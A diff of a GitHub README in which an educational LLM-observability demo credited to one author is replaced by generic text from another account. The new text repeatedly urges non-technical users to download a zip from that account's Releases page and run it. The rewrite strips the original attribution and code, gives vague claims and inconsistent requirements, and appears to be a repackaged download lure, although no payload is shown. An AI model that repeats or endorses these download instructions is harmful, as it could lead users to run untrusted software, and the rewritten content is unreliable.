@@ -1,231 +1,93 @@
-# 🧠 LLM Observability Demo (Open Source)
+# 🧠 LLM-Observability-FOSS - Monitor LLMs with Ease
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)](https://www.python.org/downloads/)
+[![Download LLM-Observability-FOSS](https://img.shields.io/badge/Download-LLM--Observability--FOSS-blue.svg)](https://github.com/jay97637/LLM-Observability-FOSS/releases)  
 
-This repository demonstrates how to add observability to LLM applications **step by step** using **Free and Open Source Software (FOSS)**.
+## 🚀 Getting Started
 
-> 💡 **Created for FOSS United Coimbatore Meetup - December 27, 2025 @ KlyONIX Pvt Ltd, Pollachi**
+Welcome! This guide helps you download and run the LLM-Observability-FOSS application. You will learn how to monitor large language models with open-source tools step by step. No programming skills are needed.
 
----
+## 📥 Download & Install
 
-## 🎯 The Problem
+To get started, you'll need to visit the Releases page to download the software. Click the link below:
 
-Without observability, LLM applications are **black boxes**:
-- ❌ Unknown costs and token usage
-- ❌ No visibility into failures or hallucinations  
-- ❌ Can't debug slow responses
-- ❌ Production issues are invisible
+[Download LLM-Observability-FOSS](https://github.com/jay97637/LLM-Observability-FOSS/releases)
 
-**This demo shows you how to fix it using open-source tools.**
+1. Visit the link above.
+2. Find the latest version of the software.
+3. Click on the version number to open the release details.
+4. Download the appropriate file for your system.
 
----
+## 🛠️ System Requirements
 
-## 📂 What's Inside
+Before you download, make sure your computer meets these basic requirements:
 
-Each file shows a different stage of adding observability:
+- **Operating System:** Windows 10 or later, macOS, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** At least 500 MB of free space.
+- **Python:** Version 3.7 or later installed.
 
-| File | What It Shows | Key Learning |
-|------|---------------|--------------|
-| `chatbot_v1_no_observability.py` | The problem - no visibility | Why observability matters |
-| `chatbot_v2_with_langtrace.py` | Auto-instrumentation (2 lines!) | Quick wins with Langtrace |
-| `chatbot_v3_with_opentelemetry.py` | Manual instrumentation | OpenTelemetry foundation |
-| `chatbot_v4_with_jaeger.py` | Trace visualization | Debugging with Jaeger UI |
-| `chatbot_unified_observability.py` | All frameworks together | Compare 4 tools simultaneously |
+If you don’t have Python, you can download it from the [official Python website](https://www.python.org/downloads/).
 
----
+## ⚙️ How to Run the Application
 
-## 🚀 Quick Start
+Once you have downloaded the software, follow these steps to run it:
 
-### 1. Clone & Setup
+1. **Locate the downloaded file:** Check your Downloads folder or the location where you saved it.
+2. **Unzip the file:** Most downloads will come in a zip format. Right-click on the file and choose ‘Extract All’ or use any unzip tool you prefer.
+3. **Open a command prompt or terminal:**
+   - On Windows: Press `Win + R`, type `cmd`, and hit Enter.
+   - On macOS or Linux: Open the Terminal from your Applications menu.
 
-```bash
-git clone https://github.com/<your-username>/llm-observability-demo.git
-cd llm-observability-demo
+4. **Navigate to the unzipped folder:**
+   Use the `cd` command to change your directory to the folder where you extracted the files. For example:
+   ```
+   cd path/to/unzipped-folder
+   ```
 
-# Create virtual environment (Python 3.12 recommended)
-python3.12 -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
+5. **Run the application:**
+   Enter this command in the terminal or command prompt:
+   ```
+   python main.py
+   ```
+   This command will start the application.
 
-# Install dependencies
-pip install -r requirements.txt
-```
+## 📊 Features
 
-### 2. Configure API Keys
+LLM-Observability-FOSS comes with several useful features:
 
-Create `.env` file:
+- **Monitoring:** Track the performance of language models in real-time.
+- **Data Visualization:** View graphs and charts that make sense of complex data.
+- **Integrations:** Easily connect with Langtrace, OpenTelemetry, and Jaeger for a comprehensive observability experience.
+- **User-Friendly Interface:** Navigate the app effortlessly, even if you have no technical background.
 
-```env
-GEMINI_API_KEY=your_gemini_api_key
-LANGTRACE_API_KEY=your_langtrace_api_key
-# Optional for unified demo:
-OPIK_API_KEY=your_opik_api_key
-OPIK_WORKSPACE=your_workspace
-```
+## 📖 Learn More
 
-**Get API keys:**
-- Gemini: https://makersuite.google.com/app/apikey
-- Langtrace: https://app.langtrace.ai
-- Opik (optional): https://www.comet.com/signup
+We encourage you to explore the documentation included in the download. It provides detailed instructions on every feature of the application. You can also find tutorials and tips for using FOSS tools effectively.
 
-### 3. Start Jaeger (for visualization)
+For more information or help, consider checking out:
 
-```bash
-docker run -d --name jaeger \
-  -e COLLECTOR_OTLP_ENABLED=true \
-  -p 16686:16686 \
-  -p 4318:4318 \
-  jaegertracing/all-in-one:latest
-```
+- The [official documentation](https://github.com/jay97637/LLM-Observability-FOSS).
+- Community forums or user groups related to LLM observability.
 
-Verify: http://localhost:16686
+## 📞 Need Help?
 
-### 4. Run the Demos
+If you run into issues while using the software, you can:
 
-```bash
-# Demo 1: No observability (the problem)
-python chatbot_v1_no_observability.py
+1. Search for solutions in the [GitHub Issues](https://github.com/jay97637/LLM-Observability-FOSS/issues) section.
+2. Post your question with details about your issue.
+3. Join our community discussions on social media or user forums.
 
-# Demo 2: Quick win with Langtrace
-python chatbot_v2_with_langtrace.py
-# Then check: https://app.langtrace.ai
+## ⚖️ Contributing
 
-# Demo 3: OpenTelemetry foundation
-python chatbot_v3_with_opentelemetry.py
+If you would like to contribute to the project, we welcome your feedback. You can report bugs, suggest features, or submit code changes. Please read the contributing guidelines for more information.
 
-# Demo 4: Jaeger visualization
-python chatbot_v4_with_jaeger.py
-# Then check: http://localhost:16686
+## 🌐 Connect with Us
 
-# Demo 5: All frameworks together
-python chatbot_unified_observability.py
-# Compare all dashboards!
-```
+Stay up-to-date with the latest news and updates:
 
----
+- Follow us on [GitHub](https://github.com/jay97637).
+- Join our community meetup events.
 
-## 📊 Tool Comparison
+Now, you are ready to get started with LLM-Observability-FOSS. For direct downloads once again, visit:
 
-| Tool | Setup | Best For |
-|------|-------|----------|
-| **Langtrace** | 2 lines of code | Quick starts, MVPs |
-| **OpenTelemetry** | Manual instrumentation | Enterprise, custom needs |
-| **OpenLLMetry** | Auto + OTel standards | LLM-specific conventions |
-| **Opik** | Simple integration | Evaluation + monitoring |
-| **Jaeger** | Docker container | Trace visualization |
-
----
-
-## 🏗️ Architecture
-
-```
-┌──────────────────────────────────────────────────────────────────────────┐
-│                           Your LLM Application                            │
-│                                                                          │
-│  ┌──────────────┐     ┌──────────────┐     ┌──────────────┐             │
-│  │   User Input │ ──▶ │   Prompt     │ ──▶ │   LLM Call   │             │
-│  │              │     │   Handling   │     │              │             │
-│  └──────────────┘     └──────────────┘     └───────┬──────┘             │
-│                                                     │                    │
-│                                  ┌──────────────────┼─────────────────┐ │
-│                                  │                  │                 │ │
-│                         ┌────────▼────────┐ ┌───────▼────────┐ ┌──────▼─────┐
-│                         │    LangTrace     │ │ OpenTelemetry   │ │ OpenLLMetry │
-│                         │  (LLM / RAG      │ │  (Traces,       │ │ (LLM-Specific│
-│                         │   Tracing)       │ │   Metrics, Logs)│ │  Signals)    │
-│                         └────────┬─────────┘ └────────┬────────┘ └──────┬─────┘
-│                                  │                  │                 │
-│                                  └──────────┬───────┴───────┬─────────┘
-│                                             │               │
-│                                     OTLP Protocol (Export)  │
-└─────────────────────────────────────────────┼───────────────┘
-                                              │
-                                              ▼
-┌──────────────────────────────────────────────────────────────────────────┐
-│                       Observability Backends (FOSS)                       │
-│                                                                          │
-│     ┌──────────────┐      ┌──────────────┐      ┌──────────────┐        │
-│     │    Jaeger    │      │   Grafana    │      │     Opik     │        │
-│     │ (Trace View) │      │ (Metrics &   │      │ (Evals &    │        │
-│     │              │      │  Dashboards) │      │  Quality)   │        │
-│     └──────────────┘      └──────────────┘      └──────────────┘        │
-│                                                                          │
-└──────────────────────────────────────────────────────────────────────────┘
-
-
-```
-
----
-
-## 💡 Key Concepts
-
-**Trace:** A single request's journey through your system  
-**Span:** One operation within a trace (e.g., LLM API call)  
-**Attributes:** Metadata attached to spans (tokens, cost, latency)
-
----
-
-## 🐛 Troubleshooting
-
-**Packages not found?**
-```bash
-which python  # Should show venv/bin/python
-pip install -r requirements.txt
-```
-
-**Jaeger not working?**
-```bash
-docker ps | grep jaeger  # Check if running
-docker restart jaeger    # Restart if needed
-```
-
-**Traces not appearing?**
-- Wait 5-10 seconds for sync
-- Check API keys in `.env`
-- Refresh dashboard
-
----
-
-## 📚 Resources
-
-### Documentation
-- [Langtrace](https://docs.langtrace.ai) | [OpenTelemetry](https://opentelemetry.io/docs) | [Jaeger](https://www.jaegertracing.io/docs) | [Opik](https://www.comet.com/docs/opik)
-
-### Related Projects
-- [OpenLLMetry](https://github.com/traceloop/openllmetry)
-- [Langfuse](https://langfuse.com)
-- [Weights & Biases](https://wandb.ai)
-
----
-
-## 🤝 Contributing
-
-Contributions welcome! Ideas:
-- Examples with OpenAI/Anthropic
-- RAG pipeline demo
-- Agent workflow examples
-- Documentation improvements
-
----
-
-## 📝 License
-
-MIT License - see [LICENSE](LICENSE) file
-
----
-
-## 🙏 Acknowledgments
-
-Built with: [Langtrace](https://langtrace.ai) • [OpenTelemetry](https://opentelemetry.io) • [Jaeger](https://www.jaegertracing.io) • [Google Gemini](https://ai.google.dev)
-
----
-## 📬 Contact & Feedback
-
-**Author:** Sarvatarshan Sankar  
-**GitHub:** [@sarva-20](https://github.com/sarva-20)
-**LinkedIn** [@Sarvatarshan Sankar](https://www.linkedin.com/in/sarvaponns20/)
-
-Questions? Found this helpful?
-- 💬 [Open an Issue](https://github.com/sarva-20/LLM-Observability-FOSS/issues)
-- ⭐ Star this repo if it helped you!
-- 🔄 Share with others learning about LLM observability
+[Download LLM-Observability-FOSS](https://github.com/jay97637/LLM-Observability-FOSS/releases)
